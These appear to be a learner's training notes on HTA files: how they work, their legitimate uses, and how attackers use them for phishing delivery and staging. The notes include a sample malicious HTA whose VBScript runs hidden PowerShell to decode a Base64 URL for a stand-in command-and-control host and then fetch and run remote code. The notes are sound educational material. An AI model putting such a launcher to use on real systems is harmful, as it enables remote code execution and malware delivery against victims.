# day 21

* Not long ago - in the summer of 2025 - researchers discovered that ransomware groups were using HTA files disguised as fake verification pages to spread the Epsilon Red ransomware. 

* HTML Application (HTA) files are files that contain HTML, JScript, and or VBScript code that can be executed on client system. This can to lead to more dynamic applications or remote code execution on a client or victim.

* An HTA file is like a small desktop app built using familiar web technologies such as HTML, CSS, and JavaScript. Unlike regular web pages that open inside a browser, HTA files run directly on Windows through a built-in component called Microsoft HTML Application Host - mshta.exe process. This allows them to look and behave like lightweight programs with their own interfaces and actions. In legitimate use cases, HTA files serve several practical purposes:
    - Automating administrative or setup tasks.
    - Providing quick interfaces for internal scripts.
    - Testing small prototypes without building full software.
    - Offering lightweight IT support utilities for daily use.

* In short, HTA files were designed as a convenient way to blend the simplicity of the web with the power of desktop applications.

* Browsers may block downloading HTA files.

* HTA file sturcture:
    - An HTA file usually contains three main parts:
        1. __The HTA declaration__: This defines the file as an HTML Application and can include basic properties like title, window size, and behaviour.
        2. __The interface (HTML and CSS)__: This section creates the layout and visuals, such as buttons, forms, or text.
        3. __The script (VBScript or JavaScript)__: Here is where the logic lives; it defines what actions the HTA will perform when opened or when a user interacts with it.

    - example:
    ```html
    <html>
    <head>
        <HTA:APPLICATION 
            ID="TBFCApp"
            APPLICATIONNAME="Utility Tool"
            BORDER="thin"
            CAPTION="yes"
            SHOWINTASKBAR="yes"
        />
    </head>
    <body>
        <input type="button" value="Say Hello" onclick="MsgBox('Hello from Wareville!')">
    </body>
    </html>
    ```

* HTA files are attractive because they combine familiar web markup with script execution on Windows. In the hands of a defender, they’re a handy automation tool; in the hands of someone wanting to bypass controls, they can be used as a delivery mechanism or launcher.

* Common purposes of malicious HTA use:
    - __Initial access/delivery__: HTA files are often delivered by phishing (email attachments, fake web pages, or downloads) and run via mshta.exe.
    - __Downloaders/droppers__: An HTA can execute a script that fetches additional binaries or scripts from the attacker's C2 (Command & Control).
    - __Obfuscation/evasion__: HTAs can hide intent by embedding encoded data(Base64), by using short VBScript/JScript fragments, or by launching processes with hidden windows.
    - __Living-off-the-land__: HTA commonly calls built-in Windows tools (mshta.exe, powershell.exe, wscript.exe, rundll32.exe) to avoid adding new binaries to disk.

* Inside an HTA, you'll often find a small script that may be obfuscated or encoded. In practice, this tiny script usually does one of two things: downloads and runs a second-stage payload, or opens a remote control channel to let something else talk back to the attacker's server. These lightweight scripts are the reason HTAs are effective launchers, a single small file can pull in the rest of the malware.
    - Example:
    ```html
    <head>
        <title>Angry King Malhare</title>
        <HTA:APPLICATION ID="Malhare" APPLICATIONNAME="B" BORDER="none" 
        SHOWINTASKBAR="no" SINGLEINSTANCE="yes" WINDOWSTATE="minimize">
        </HTA:APPLICATION>
        <script language="VBScript">
        Option Explicit:Dim a:Set a=CreateObject("WScript.Shell"):Dim 
        b:b="powershell -NoProfile -ExecutionPolicy Bypass -Command "" 
        {$U=
        [System.Text.Encoding]::UTF8.GetString([System.Convert]::
        FromBase64String('aHR0cHM6Ly9yYXcua2luZy1tYWxoYXJlWy5dY29tL2MyL3NpbHZlci9yZWZzL2hlYWRzL21haW4vUkVEQUNURUQudHh0')) 
        $C=(Invoke-WebRequest -Uri 
        $U -UseBasicParsing).Content 
        $B=[scriptblock]::Create($C) $B}""":a.Run 
        b,0,True:self.close
        </script>
    </head>
    ```

* VBScript block is the active part of the file where attackers often embed encoded commands or call external resources, and where PowerShell command -a pattern commonly seen in malicious HTAs used for delivery or launching- is found.

* Encoded strings mostly hide URLs. Decoding it reveals the attacker’s command-and-control (C2) address or a resource used in the attack.

* HTA files are windows-specific, but we can run them using 'wine', 'winapps'...